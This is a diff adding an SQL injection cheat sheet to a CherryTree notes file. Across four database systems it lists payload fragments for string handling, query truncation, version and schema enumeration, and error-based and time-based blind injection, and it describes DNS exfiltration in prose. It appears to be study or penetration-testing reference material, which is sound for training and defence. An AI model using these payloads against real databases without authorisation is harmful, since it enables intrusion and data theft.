@@ -1,4 +1,244 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
-  <node unique_id="6" master_id="0" name="CMDs" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="1" foreground="#33d17a" ts_creation="1712690852" ts_lastsave="1712690852"/>
+  <node unique_id="6" master_id="0" name="CMDs" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="1" foreground="#33d17a" ts_creation="1712690852" ts_lastsave="1712691676">
+    <rich_text scale="h1" foreground="#8ff0a4" weight="heavy">SQL Injection Cheat Sheet</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text weight="heavy">String Concatenation</rich_text>
+    <rich_text>
+• Concatenate multiple strings into a single string.◇ </rich_text>
+    <rich_text weight="heavy">Oracle:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">'foo'||'bar'</rich_text>
+    <rich_text>
+◇ </rich_text>
+    <rich_text weight="heavy">Microsoft:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">'foo'+'bar'</rich_text>
+    <rich_text>
+◇ </rich_text>
+    <rich_text weight="heavy">PostgreSQL:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">'foo'||'bar'</rich_text>
+    <rich_text>
+◇ </rich_text>
+    <rich_text weight="heavy">MySQL:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">'foo' 'bar'</rich_text>
+    <rich_text> (Note the space between the strings) or </rich_text>
+    <rich_text family="monospace">CONCAT('foo','bar')</rich_text>
+    <rich_text>
+
+
+
+</rich_text>
+    <rich_text weight="heavy">Substring</rich_text>
+    <rich_text>
+◇ Extract a substring from a specified offset for a given length.▪ </rich_text>
+    <rich_text weight="heavy">Oracle:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SUBSTR('foobar', 4, 2)</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">Microsoft:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SUBSTRING('foobar', 4, 2)</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">PostgreSQL:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SUBSTRING('foobar', 4, 2)</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">MySQL:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SUBSTRING('foobar', 4, 2)</rich_text>
+    <rich_text>
+
+
+
+</rich_text>
+    <rich_text weight="heavy">Comments</rich_text>
+    <rich_text>
+◇ Use comments to truncate a query.▪ </rich_text>
+    <rich_text weight="heavy">Oracle:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">--comment</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">Microsoft:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">--comment</rich_text>
+    <rich_text> or </rich_text>
+    <rich_text family="monospace">/*comment*/</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">PostgreSQL:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">--comment</rich_text>
+    <rich_text> or </rich_text>
+    <rich_text family="monospace">/*comment*/</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">MySQL:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">#comment</rich_text>
+    <rich_text>, </rich_text>
+    <rich_text family="monospace">-- comment</rich_text>
+    <rich_text> (Note the space after </rich_text>
+    <rich_text family="monospace">--</rich_text>
+    <rich_text>), or </rich_text>
+    <rich_text family="monospace">/*comment*/</rich_text>
+    <rich_text>
+
+
+
+</rich_text>
+    <rich_text weight="heavy">Database Version</rich_text>
+    <rich_text>
+◇ Query the database type and version.▪ </rich_text>
+    <rich_text weight="heavy">Oracle:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SELECT banner FROM v$version</rich_text>
+    <rich_text> or </rich_text>
+    <rich_text family="monospace">SELECT version FROM v$instance</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">Microsoft:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SELECT @@version</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">PostgreSQL:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SELECT version()</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">MySQL:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SELECT @@version</rich_text>
+    <rich_text>
+
+
+
+</rich_text>
+    <rich_text weight="heavy">Database Contents</rich_text>
+    <rich_text>
+◇ List the tables and their columns in the database.▪ </rich_text>
+    <rich_text weight="heavy">Oracle:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SELECT * FROM all_tables</rich_text>
+    <rich_text> and </rich_text>
+    <rich_text family="monospace">SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">Microsoft and PostgreSQL:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SELECT * FROM information_schema.tables</rich_text>
+    <rich_text> and </rich_text>
+    <rich_text family="monospace">SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">MySQL:</rich_text>
+    <rich_text> Similar to Microsoft and PostgreSQL.
+
+
+
+</rich_text>
+    <rich_text weight="heavy">Conditional Errors</rich_text>
+    <rich_text>
+◇ Test a boolean condition and trigger a database error if true.▪ </rich_text>
+    <rich_text weight="heavy">Oracle:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">Microsoft:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">PostgreSQL:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">MySQL:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SELECT IF(YOUR-CONDITION-HERE, (SELECT table_name FROM information_schema.tables), 'a')</rich_text>
+    <rich_text>
+
+
+
+</rich_text>
+    <rich_text weight="heavy">Time Delays</rich_text>
+    <rich_text>
+◇ Introduce a time delay.▪ </rich_text>
+    <rich_text weight="heavy">Oracle:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">dbms_pipe.receive_message(('a'),10)</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">Microsoft:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">WAITFOR DELAY '0:0:10'</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">PostgreSQL:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SELECT pg_sleep(10)</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">MySQL:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SELECT SLEEP(10)</rich_text>
+    <rich_text>
+
+
+
+</rich_text>
+    <rich_text weight="heavy">Conditional Time Delays</rich_text>
+    <rich_text>
+◇ Trigger a time delay based on a condition.▪ </rich_text>
+    <rich_text weight="heavy">Oracle:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">Microsoft:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">PostgreSQL:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</rich_text>
+    <rich_text>
+▪ </rich_text>
+    <rich_text weight="heavy">MySQL:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text family="monospace">SELECT IF(YOUR-CONDITION-HERE, SLEEP(10), 'a')</rich_text>
+    <rich_text>
+
+
+
+</rich_text>
+    <rich_text weight="heavy">DNS Lookup</rich_text>
+    <rich_text>
+◇ Perform a DNS lookup to an external domain.▪ Specific techniques vary by database system and setup, involving advanced features or external tools like Burp Collaborator.
+
+
+
+</rich_text>
+    <rich_text weight="heavy">DNS Lookup with Data Exfiltration</rich_text>
+    <rich_text>
+◇ Exfiltrate data via DNS lookup.▪ Specific techniques vary, generally involving concatenation of query results with a domain name and triggering a DNS request to an external server.
+
+
+
+</rich_text>
+    <rich_text weight="heavy">Note:</rich_text>
+    <rich_text> For MySQL, batched queries typically cannot be used for SQL injection, but there are exceptions with specific PHP or Python APIs.
+</rich_text>
+  </node>
 </cherrytree>
